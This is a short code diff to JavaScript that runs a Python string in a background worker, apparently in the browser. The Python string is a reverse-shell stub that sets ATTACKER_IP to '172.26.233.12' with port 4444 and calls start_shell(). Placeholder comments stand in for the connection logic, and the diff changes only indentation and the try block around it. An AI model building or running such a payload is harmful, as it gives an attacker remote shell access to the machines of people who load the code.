@@ -9,10 +9,8 @@ async function executeCommand() {
 
     logElement.textContent = "Attempting to execute Python in background worker...";
 
-    try {
-        // 1. Execute the function/script defined in the Python payload string
-        // We pass the input data to the Python context.
-        const pythonCodeToRun = `
+    // 2. Define the Python code string you want to run
+    const pythonCodeToRun = `
 import socket
 # ... (Paste the full connection logic here or define a function) ...
 ATTACKER_IP = "172.26.233.12"
@@ -20,7 +18,7 @@ PORT = 4444
 # ... (rest of the payload logic) ...
 # Call the function that encapsulates the connection attempt
 print(start_shell()) 
-`;
+    `;
 
     // 3. Set up a listener to catch the worker's response
     pythonWorker.onmessage = function(event) {
